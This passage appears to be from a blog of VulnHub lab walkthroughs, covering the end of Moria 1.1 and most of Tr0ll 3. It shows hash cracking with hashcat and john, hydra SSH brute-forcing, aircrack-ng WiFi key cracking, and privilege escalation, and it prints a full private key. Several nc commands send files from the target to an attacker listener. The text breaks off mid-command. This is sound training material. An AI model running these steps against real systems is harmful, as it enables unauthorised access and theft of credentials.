Here comes the directory listing. drwxr-xr-x 2 0 0 23 Mar 12 2017 QlVraKW4fbIkXau9zkAPNGzviT3UKntl -r-------- 1 48 48 85 Mar 12 2017 index.php -r-------- 1 48 48 161595 Mar 11 2017 moria.jpg drwxr-xr-x 3 0 0 15 Mar 12 2017 w 226 Directory send OK. ftp&amp;gt; QlVraKW4fbIkXau9zkAPNGzviT3UKntl TCP/80 (HTTP) - Obtain hashes Proceed to QlVraKW4fbIkXau9zkAPNGzviT3UKntl Prisoner&#39;s name Passkey Balin c2d8960157fc8540f6d5d66594e165e0 Oin 727a279d913fba677c490102b135e51e Ori 8c3c3152a5c64ffb683d78efc3520114 Maeglin 6ba94d6322f53f30aca4f34960203703 Fundin c789ec9fae1cd07adfc02930a39486a1 Nain fec21f5c7dcf8e5e54537cfda92df5fe Dain 6a113db1fd25c5501ec3a5936d817c29 Thrain 7db5040c351237e8332bfbba757a1019 Telchar dd272382909a4f51163c77da6356cc6f MD5(MD5(Password).Salt) Crack Hash - Hashcat Extract usernames &amp;amp; hashes ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# cat creds.txt | awk &#39;{print $2}&#39; | sed &#39;s/name//g&#39; | awk &#39;NF&#39; | tee hashes.txt c2d8960157fc8540f6d5d66594e165e0 727a279d913fba677c490102b135e51e 8c3c3152a5c64ffb683d78efc3520114 6ba94d6322f53f30aca4f34960203703 c789ec9fae1cd07adfc02930a39486a1 fec21f5c7dcf8e5e54537cfda92df5fe 6a113db1fd25c5501ec3a5936d817c29 7db5040c351237e8332bfbba757a1019 dd272382909a4f51163c77da6356cc6f ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# cat creds.txt | awk &#39;{print $1}&#39; | sed &#39;s/Prisoner.*\\|Passkey//g&#39; | awk &#39;NF&#39; | tee usernames.txt Balin Oin Ori Maeglin Fundin Nain Dain Thrain Telchar Append salt to hash w/ : delimiter ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# paste -d &quot;:&quot; hashes.txt salt | tee salted_hash_hashcat c2d8960157fc8540f6d5d66594e165e0:6MAp84 727a279d913fba677c490102b135e51e:bQkChe 8c3c3152a5c64ffb683d78efc3520114:HnqeN4 6ba94d6322f53f30aca4f34960203703:e5ad5s c789ec9fae1cd07adfc02930a39486a1:g9Wxv7 fec21f5c7dcf8e5e54537cfda92df5fe:HCCsxP 6a113db1fd25c5501ec3a5936d817c29:cC5nTr 7db5040c351237e8332bfbba757a1019:h8spZR dd272382909a4f51163c77da6356cc6f:tb9AWe Research what hashcat mode to use to crack this hash vBulletin: 2611 Crack hash ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# hashcat -a 0 -m 2611 salted_hash /usr/share/wordlists/rockyou.txt --show | cut -d &quot;:&quot; -f3 | tee passwords.txt flower rainbow spanky fuckoff hunter2 warrior abcdef darkness magic Crack Hash - John View formats dynamic_6: md5(md5($p).$s) Append salt to hash w/ $ delimiter ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# paste -d &#39;$&#39; hashes.txt salt | tee salted_hash_john c2d8960157fc8540f6d5d66594e165e0$6MAp84 727a279d913fba677c490102b135e51e$bQkChe 8c3c3152a5c64ffb683d78efc3520114$HnqeN4 6ba94d6322f53f30aca4f34960203703$e5ad5s c789ec9fae1cd07adfc02930a39486a1$g9Wxv7 fec21f5c7dcf8e5e54537cfda92df5fe$HCCsxP 6a113db1fd25c5501ec3a5936d817c29$cC5nTr 7db5040c351237e8332bfbba757a1019$h8spZR dd272382909a4f51163c77da6356cc6f$tb9AWe Crack hash ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# john --format=dynamic_6 salted_hash_john Using default input encoding: UTF-8 Loaded 9 password hashes with 9 different salts (dynamic_6 [md5(md5($p).$s) 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=2 Proceeding with single, rules:Single Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst flower (?) warrior (?) spanky (?) rainbow (?) abcdef (?) fuckoff (?) darkness (?) magic (?) hunter2 (?) 9g 0:00:00:00 DONE 2/3 (2022-03-03 18:36) 450.0g/s 1512Kp/s 2856Kc/s 2856KC/s PHOENIX..kids2 Use the &quot;--show --format=dynamic_6&quot; options to display all of the cracked passwords reliably Session completed. TCP/22 (SSH) Create wordlist in username:password format for hydra ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# paste -d &quot;:&quot; usernames.txt passwords.txt | tee hydra_creds.txt Balin:flower Oin:rainbow Ori:spanky Maeglin:fuckoff Fundin:hunter2 Nain:warrior Dain:abcdef Thrain:darkness Telchar:magic Bruteforce SSH ┌──(root💀kali)-[~/vulnHub/moria-1.1/192.168.110.36/exploit] └─# hydra -C hydra_creds.txt ssh://$ip Hydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-02 20:26:04 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries, ~1 try per task [DATA] attacking ssh://192.168.110.36:22/ [22][ssh] host: 192.168.110.36 login: Ori password: spanky 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-02 20:26:07 Ori:spanky SSH w/ Ori:spanky Privilege EscalationRoot - Via Creds Found (SSH Key) Linpeas Ori SSH’ed into localhost The known_hosts File is a client file containing all remotely connected known hosts SSH into localhost w/ private key Root Flag [root@Moria ~]# cat flag.txt “All that is gold does not glitter, Not all those who wander are lost; The old that is strong does not wither, Deep roots are not reached by the frost. From the ashes a fire shall be woken, A light from the shadows shall spring; Renewed shall be blade that was broken, The crownless again shall be king.” All That is Gold Does Not Glitter by J. R. R. Tolkien I hope you suff.. enjoyed this VM. It wasn&#39;t so hard, was it? -Abatchy [root@Moria ~]# View Root’s authorized_keys [root@Moria .ssh]# cat authorized_keys from=&quot;127.0.0.1&quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC745Nxui7BYpnolFgEldIin1zw3/7D/RHsDSzkrUqPjkUGGkCTRT95kkhylllhS71rnJ8RkWeVQeyFWMPXYpO+8A0h+9NqU/T64as5KUX9vW23w6VVBbxuC8AlcaibzzVuxSe7mvgFenRLkcihERLaT0EeQ/tmaSGScLzcP7NOWf/a4e8f+mIDnHdoUoPPc3O8lA0SOf9T2mK+WMBVWu5drRMNgOeN7Gxm0bcK2x719CWPuyqyiyqZTZpcS7TdH+gc36OUyfbCgqJGdR2gI1o17n+VhLuV4xwyXwAjuEQyAldK50EYLIu7MO9tCBGLd04UCzvZhK4b920w2igQcuvh Ori@Prison [root@Moria .ssh]# Contains Ori’s public key " }, { "title": "Vulnhub - Tr0ll 3", "url": "/posts/Tr0ll-3/", "categories": "Vulnhub, Linux", "tags": "linux-priv-esc/linux-creds-found", "date": "2022-02-25 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Fri Feb 25 17:06:11 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/tr0ll3/192.168.110.35/scans/_full_tcp_nmap.txt -oX /root/vulnHub/tr0ll3/192.168.110.35/scans/xml/_full_tcp_nmap.xml 192.168.110.35Nmap scan report for 192.168.110.35Host is up, received arp-response (0.00093s latency).Scanned at 2022-02-25 17:06:13 +08 for 8sNot shown: 65534 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 6d:d1:ea:d0:a8:1e:83:ef:c7:4f:ae:4c:bb:d6:75:19 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwbQDOa+6JujKY2lNNgrx9/W1YjX4TsL44aFRsN9wvlPEbpo84PoxLgHNKGOoYWPdhzPBYPWArJNOHDy4Bqf6h2873ppx9J4VcB0YXGCjUJiMzUIQj4Xo+UwZff8xEUfWtmBSKUZvgvFszXH6yfcOS9RTJ8KucYkthRJOcSVbkgzXODNFwh0+tNae/JndaMy/gCmufK9KsTomuSeeIDFZ3Vj44Js+f6lQAr43q9u5YSdA3PWaXjqjn7xLjQJJk2UXG8fCiskNeVB+mZoSUcKmyWGYNaIjXgS0WOTNyHrCex/wTGXbRKlbzr21r2QBaP0SbphMZvFKh55eZbFo73IX/| 256 24:5f:cb:ef:3a:db:b5:59:c6:15:51:b9:2b:9b:fa:39 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMoi8hzvy7kA90UqPWmwvcT3BvV4uNT/jve0750bpivwlqI7Zb++BFXrWhY0IGDjgz4tJ6iT8gAGAHUQ6TJxs9I=| 256 8b:96:de:4a:11:45:a7:f9:eb:60:9b:45:da:1a:21:de (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINOoGWk2LlHj3AJNTsUoGs6+4meQyZN33/UFAnujMMzyMAC Address: 08:00:27:94:61:FC (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/25%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=621OS:89C0D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=AOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5BOS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 39.064 days (since Mon Jan 17 15:34:32 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.93 ms 192.168.110.35Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Feb 25 17:06:21 2022 -- 1 IP address (1 host up) scanned in 11.19 seconds Only TCP/22 (SSH) is up.Initial FootholdTCP/22 (SSH) After turning on the machine, SSH credentials is given to us start:here SSH w/ start:here Privilege EscalationEagle - Hidden Directory View files in start’s home directory start@Tr0ll3:~/...$ cd .. start@Tr0ll3:~$ ls -la total 44 drwx------ 7 start start 4096 Feb 25 03:16 . drwxr-xr-x 10 root root 4096 Jun 19 2015 .. drwxrwxr-x 2 start start 4096 Jun 19 2015 ... -rw------- 1 start start 114 Feb 25 03:16 .bash_history -rw-r--r-- 1 start start 220 Jun 17 2015 .bash_logout -rw-r--r-- 1 start start 3637 Jun 17 2015 .bashrc drwxrwxr-x 2 start start 4096 Jun 18 2015 bluepill drwx------ 2 start start 4096 Jun 17 2015 .cache drwx------ 3 start start 4096 Aug 1 2019 .gnupg -rw-r--r-- 1 start start 675 Jun 17 2015 .profile drwxrwxr-x 2 start start 4096 Jun 17 2015 redpill start@Tr0ll3:~$ Interesting directories ... redpill bluepill View files in interesting directories ... start@Tr0ll3:~$ cd ... start@Tr0ll3:~/...$ ls -la total 12 drwxrwxr-x 2 start start 4096 Jun 19 2015 . drwx------ 7 start start 4096 Feb 25 03:16 .. -rw-rw-r-- 1 start start 13 Jun 19 2015 about_time start@Tr0ll3:~/...$ cat about_time eagle:oxxwJo start@Tr0ll3:~/...$ eagle:oxxwJo redpill start@Tr0ll3:~/bluepill$ cd ../redpill/ start@Tr0ll3:~/redpill$ ls -la total 12 drwxrwxr-x 2 start start 4096 Jun 17 2015 . drwx------ 7 start start 4096 Feb 25 03:16 .. -rw-rw-r-- 1 start start 17 Jun 17 2015 this_will_surely_work start@Tr0ll3:~/redpill$ cat this_will_surely_work step2:Password1! start@Tr0ll3:~/redpill$ step2:Password1! redpill is a rabbit hole bluepill start@Tr0ll3:~$ cd bluepill/ start@Tr0ll3:~/bluepill$ ls -la total 12 drwxrwxr-x 2 start start 4096 Jun 18 2015 . drwx------ 7 start start 4096 Feb 25 03:16 .. -rw-rw-r-- 1 start start 18 Jun 17 2015 awesome_work start@Tr0ll3:~/bluepill$ cat awesome_work http://bfy.tw/ODa start@Tr0ll3:~/bluepill$ bluepill is a rabbit hole Switch to eagle w/ eagle:oxxwJo Wytshadow Check eagle’s sudo access eagle@Tr0ll3:~$ sudo -l Matching Defaults entries for eagle on Tr0ll3: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User eagle may run the following commands on Tr0ll3: (root) /usr/sbin/service vsftpd start /usr/sbin/service vsftpd start Start vsftpd as root eagle@Tr0ll3:~$ sudo /usr/sbin/service vsftpd start Check for newly opened ports ┌──(root💀kali)-[~/vulnHub/tr0ll3] └─# nmap $ip -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 17:34 +08 Nmap scan report for 192.168.110.35 Host is up (0.00048s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh MAC Address: 08:00:27:94:61:FC (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds TCP/21 (FTP) Wytshadow - TCP/21 (FTP) Access FTP w/ anonymous &amp;amp; check for write access ┌──(root💀kali)-[~/vulnHub/tr0ll3] └─# ftp $ip Connected to 192.168.110.35. 220 Welcome Noob, you are still doing it wrong :) Name (192.168.110.35:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; dir 229 Entering Extended Passive Mode (|||44032|) 150 Here comes the directory listing. -rwxrwxrwx 1 0 0 49962 Aug 01 2019 wytshadow.cap 226 Directory send OK. ftp&amp;gt; put test local: test remote: test 229 Entering Extended Passive Mode (|||65448|) 550 Permission denied. ftp&amp;gt; Download wytshadow.cap ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot/ftp] └─# ftp $ip Connected to 192.168.110.35. 220 Welcome Noob, you are still doing it wrong :) Name (192.168.110.35:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; get wytshadow.cap local: wytshadow.cap remote: wytshadow.cap 229 Entering Extended Passive Mode (|||36040|) 150 Opening BINARY mode data connection for wytshadow.cap (49962 bytes). 100% |************************************************************************| 49962 4.17 MiB/s 00:00 ETA 226 Transfer complete. 49962 bytes received in 00:00 (3.94 MiB/s) ftp&amp;gt; Wytshadow - Crack .cap file wytshadow.cap captured WiFi traffic ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot/ftp] └─# tcpdump -r wytshadow.cap reading from file wytshadow.cap, link-type IEEE802_11 (802.11), snapshot length 65535 IEEE802_11 Failed to crack ┌──(root💀kali)-[~/tools/google-indexing-api-bulk] └─# aircrack-ng wytshadow.cap -w /usr/share/wordlists/rockyou.txt We have to obtain another wordlist, or this is a rabbit hole.Wytshadow - Linpeas Linpeas ╔══════════╣ Unexpected in root /vmlinuz /lol /initrd.img.old /gatein-management /.hints /gatein-sso /backups /vmlinuz.old /initrd.img lol .hints View files in .hints directory eagle@Tr0ll3:/$ find .hints/ .hints/ .hints/lol .hints/lol/rofl .hints/lol/rofl/roflmao .hints/lol/rofl/roflmao/this .hints/lol/rofl/roflmao/this/isnt .hints/lol/rofl/roflmao/this/isnt/gonna .hints/lol/rofl/roflmao/this/isnt/gonna/stop .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt gold_star.txt View gold_star.txt ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot/ftp] └─# file gold_star.txt gold_star.txt: ASCII text Contains unreadable characters Transfer gold_star.txt to kali eagle@Tr0ll3:/$ nc 192.168.110.4 4444 &amp;lt; .hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot/ftp] └─# nc -nvlp 4444 &amp;gt; gold_star.txt Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.110.35. Ncat: Connection from 192.168.110.35:51136. Wytshadow - Crack .cap file Crack .cap file w/ gold_star.txt wordlist ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot/ftp] └─# aircrack-ng wytshadow.cap -w gold_star.txt Aircrack-ng 1.6 [00:09:21] 2426272/3248872 keys tested (4397.45 k/s) Time left: 3 minutes, 7 seconds 74.68% KEY FOUND! [ gaUoCe34t1 ] Master Key : ED 12 0B 40 F5 AF 80 16 F5 F7 4F 9F 9E 39 BB AE 00 32 07 E9 26 81 31 DB 9C 54 64 84 5E 5D 19 C6 Transient Key : 7F 1C A9 01 4E B9 B3 6F B3 95 7D D2 6E C9 10 BE 50 D4 1A 6C 72 F8 AB 8B 97 A4 20 B1 2D 92 19 18 C7 86 C0 17 2D 05 28 C7 6F 95 06 12 4F C2 F5 2A 87 B7 F5 21 22 3D F7 CA BC 99 8B B5 CA 15 EA 43 EAPOL HMAC : 73 4D E4 22 8E B7 F2 91 4E 74 7D CF 59 73 80 F7 wytshadow:gaUoCe34t1 Switch to wytshadow w/ wytshadow:gaUoCe34t1 eagle@Tr0ll3:/$ su wytshadow Password: gaUoCe34t1 wytshadow@Tr0ll3:/$ Genphlux - SUDO Check wytshadow’s sudo access wytshadow@Tr0ll3:/$ sudo -l [sudo] password for wytshadow: Matching Defaults entries for wytshadow on Tr0ll3: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wytshadow may run the following commands on Tr0ll3: (root) /usr/sbin/service nginx start wytshadow@Tr0ll3:/$ /usr/sbin/service nginx start View files in wytshadow’s home directory wytshadow@Tr0ll3:~$ ls -la total 40 drwx------ 4 wytshadow wytshadow 4096 Aug 2 2019 . drwxr-xr-x 10 root root 4096 Jun 19 2015 .. -rw-r--r-- 1 wytshadow wytshadow 220 Jun 17 2015 .bash_logout -rw-r--r-- 1 wytshadow wytshadow 3637 Jun 17 2015 .bashrc drwx------ 2 wytshadow wytshadow 4096 Jun 17 2015 .cache drwx------ 3 wytshadow wytshadow 4096 Aug 1 2019 .gnupg -rwsrwxrwx 1 genphlux root 8566 Jun 17 2015 oohfun -rw-r--r-- 1 wytshadow wytshadow 675 Jun 17 2015 .profile wytshadow@Tr0ll3:~$ oohfun Execute oohfun to see what it does wytshadow@Tr0ll3:~$ ./oohfun ... iM Cr@zY L1k3 AAA LYNX ... LYNX is a web browser for command line interface Start nginx as root wytshadow@Tr0ll3:~$ sudo /usr/sbin/service nginx start Check for newly opened ports ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot/ftp] └─# nmap $ip -p- -v PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 8080/tcp open http-proxy MAC Address: 08:00:27:94:61:FC (Oracle VirtualBox virtual NIC) TCP/8080 Access TCP/8080 w/ LYNX ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot] └─# lynx http://192.168.110.35:8080 genphlux:HF9nd0cR! genphlux:HF9nd0cR! Switch to genphlux w/ genphlux:HF9nd0cR! wytshadow@Tr0ll3:/tmp$ su genphlux Password: genphlux@Tr0ll3:/tmp$ Malues - Creds Found (SSH Key) Check genphlux’s sudo access genphlux@Tr0ll3:~$ sudo -l Matching Defaults entries for genphlux on Tr0ll3: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User genphlux may run the following commands on Tr0ll3: (root) /usr/sbin/service apache2 start genphlux@Tr0ll3:~$ /usr/sbin/service apache2 start View files in genphlux’s home directory genphlux@Tr0ll3:~$ ls -la total 44 drwx------ 4 genphlux genphlux 4096 Aug 2 2019 . drwxr-xr-x 10 root root 4096 Jun 19 2015 .. -rw-r--r-- 1 genphlux genphlux 220 Jun 17 2015 .bash_logout -rw-r--r-- 1 genphlux genphlux 3637 Jun 17 2015 .bashrc drwx------ 2 genphlux genphlux 4096 Jun 17 2015 .cache drwx------ 3 genphlux genphlux 4096 Aug 1 2019 .gnupg -rw-rw-r-- 1 genphlux genphlux 1675 Jun 18 2015 maleus -rw-r--r-- 1 genphlux genphlux 675 Jun 17 2015 .profile -rw------- 1 genphlux genphlux 5649 Jun 17 2015 .viminfo -rw-rw-r-- 1 genphlux genphlux 931 Aug 2 2019 xlogin genphlux@Tr0ll3:~$ maleus View contents of maleus genphlux@Tr0ll3:~$ cat maleus -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4 u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g 7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb 1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6 syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO 2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb 5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9 xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK -----END RSA PRIVATE KEY----- Could be maleus private key Transfer private key to kali ┌──(root💀kali)-[~/vulnHub/tr0ll3/192.168.110.35/loot] └─# nc -nvlp 4444 &amp;gt; id_rsa Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.110.35. Ncat: Connection from 192.168.110.35:51142. genphlux@Tr0ll3:~$ nc 